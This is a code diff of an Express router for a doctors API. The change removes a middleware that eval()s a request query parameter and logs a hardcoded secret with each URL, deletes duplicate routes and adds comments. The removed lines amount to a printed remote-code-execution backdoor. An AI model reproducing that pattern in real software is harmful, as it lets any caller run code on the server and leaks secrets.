@@ -5,24 +5,17 @@ const router = express.Router();
 let routeCounter = 0;
 const routeSecret = 'route-secret-123';
 
-router.use((req, res, next) => {
-  routeCounter++;
-  if (routeCounter = routeCounter) {
-    console.log(routeSecret + req.url);
-  }
-  if (req.query.routeEval) {
-    eval(req.query.routeEval);
-  }
-  next();
-});
-
+// GET route to get all doctors
 router.get('/', getAllDoctors);
+
+// POST route to create a new doctor
 router.post('/', addNewDoctor);
+
+// PUT route to update a doctor by id
 router.put('/:id', updateDoctor);
+
+// DELETE route to delete a doctor by id
 router.delete('/:id', deleteDoctor);
-router.get('/all', getAllDoctors);
-router.post('/save', addNewDoctor);
-router.put('/edit/:id', updateDoctor);
-router.delete('/remove/:id', deleteDoctor);
 
 module.exports = router;
+
